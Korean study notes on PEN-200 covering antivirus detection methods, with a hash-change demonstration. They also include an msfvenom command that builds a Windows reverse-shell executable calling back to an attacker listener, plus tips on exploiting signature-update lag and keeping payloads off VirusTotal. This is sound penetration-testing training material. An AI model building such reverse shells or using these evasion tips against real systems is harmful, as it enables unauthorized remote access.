# 15.1.3 탐지 기법

> **Detection Methods** · PEN-200 §15.1.3

시그니처의 문법과 적용 범위는 대상 엔진에 따라 달라도, 목적은 하나 — 특정 위협을 유일하게 식별하는 것임. 이 절이 다루는 탐지 방법론은 넷이고 실제 제품은 이들을 섞어 씀 — 시그니처 기반, 휴리스틱 기반, 행위 기반, 머신러닝.

**시그니처 기반 탐지**는 사실상 제한 목록(restricted list) 기술임. 파일시스템을 알려진 악성코드 시그니처로 훑고 걸린 파일을 격리함. 시그니처는 파일 해시 그 자체일 수도 있고, 그 악성코드에만 있어야 할 바이너리 값·문자열 패턴의 집합일 수도 있음.

**해시 하나에만 기대는 것은 약한 전략임** — 파일에서 1비트만 바뀌어도 해시가 완전히 달라지기 때문임. Kali 에서 `offsec` 문자열이 든 텍스트 파일을 만들고 `xxd -b` 로 이진 표현을 덤프함(왼쪽이 오프셋, 가운데가 이진 표현, 오른쪽이 ASCII).

```
kali@kali:~$ xxd -b malware.txt
00000000: 01101111 01100110 01100110 01110011 01100101 01100011  offsec
00000006: 00001010                                               .
```

*`offsec` 원본의 이진 표현*

```
kali@kali:~$ sha256sum malware.txt
c361ec96c8f2ffd45e8a990c41cfba4e8a53a09e97c40598a0ba2383ff63510e  malware.txt
```

*원본 파일의 SHA256*

마지막 글자만 대문자 `C` 로 바꿈. 이진 표현에서 달라지는 것은 **왼쪽에서 셋째 비트 하나뿐**임.

```
kali@kali:~$ xxd -b malware.txt
00000000: 01101111 01100110 01100110 01110011 01100101 01000011  offseC
00000006: 00001010
```

*마지막 글자만 대문자로 바꾼 뒤의 이진 표현*

```
kali@kali:~$ sha256sum malware.txt
15d0fa07f0db56f27bcc8a784c1f76a8bf1074b3ae697cf12acf73742a0cc37c  malware.txt
```

*1비트 변경 뒤의 SHA256 — 값이 통째로 달라짐*

해시 기반 시그니처 탐지의 취약함이 그대로 드러남. 이 한계 때문에 벤더들이 아래 방법들을 추가로 도입함.

**휴리스틱 기반 탐지**는 여러 규칙과 알고리즘으로 어떤 동작이 악성인지 판정함. 바이너리의 명령어 집합을 밟아 나가거나, 기계어를 디스어셈블하고 나아가 디컴파일·분석해 프로그램의 전체 지도를 얻는 방식임. 노리는 것은 단순 바이트열이 아니라 **악성으로 간주되는 패턴과 프로그램 호출**임.

**행위 기반 탐지**는 바이너리의 «행동»을 동적으로 분석함. 문제의 파일을 소형 가상 머신이나 샌드박스 같은 에뮬레이션 환경에서 실제로 실행해 악성으로 간주되는 행위를 찾음.

**머신러닝 탐지**는 추가 메타데이터를 수집·분석해 미지 위협을 잡음. Windows Defender 는 ML 구성 요소가 둘 — 모델과 휴리스틱을 만드는 클라이언트 ML 엔진, 제출된 모든 샘플로 구성한 메타데이터 기반 모델과 대조하는 클라우드 ML 엔진. 클라이언트 쪽이 양성 여부를 판단하지 못하면 클라우드에 최종 판정을 질의함.

**뒤의 셋은 시그니처를 필요로 하지 않아** 미지 악성코드나 알려진 악성코드의 변종을 훨씬 효과적으로 식별함. 다만 휴리스틱·행위·ML 의 구현이 벤더마다 달라 **«어떤 코드를 악성으로 보는가»가 제품마다 다름**. 탐지율을 올리려고 여러 방법을 조합하는 것이 보통임.

효과를 실측하려고 인기 있는 Metasploit 페이로드를 스캔해 봄. `msfvenom` 으로 단순 TCP 리버스셸이 든 표준 PE(Portable Executable) 파일을 생성함. PE 는 Windows 의 실행·객체 파일 포맷이며, Windows Loader 가 감싸인 실행 코드를 다루는 데 필요한 정보 — 요구되는 동적 라이브러리, API 임포트·익스포트 테이블 등 — 를 담은 자료구조임.

⚠️ 페이로드를 만들기 전에 **Kali 를 최신으로 올려 둘 것.** Metasploit 은 갱신이 잦아 AV 시그니처도 함께 바뀌는데, 벤더가 시그니처를 다시 만들어 배포하기까지 본질적인 지연이 있음. 이 지연 때문에 **갓 나온 Metasploit 이 낡은 시그니처를 그대로 통과하는 이점**이 생김.

```
kali@kali:~$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.1 LPORT=443 -f exe
> binary.exe
...
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
```

*테스트용 악성 PE 생성 — 교재 PDF 자체의 조판 때문에 `> binary.exe` 리다이렉트가 다음 줄로 나뉘어 보임. 실제로는 한 줄 명령이므로 그대로 두 줄로 복사해 쓰면 안 됨*

AV 를 여러 개 깔지 않고 VirusTotal 에 올려 제품별 탐지율을 확인함.

⚠️ VirusTotal 은 편리하지만 **제출마다 해시를 만들고 원본 파일을 보관하며, 파일과 메타데이터를 참여 AV 벤더 전원에게 공유함.** 첫 제출 시점부터 그 해시는 공개된 것으로 봐야 하므로 민감한 페이로드는 올리지 말 것.
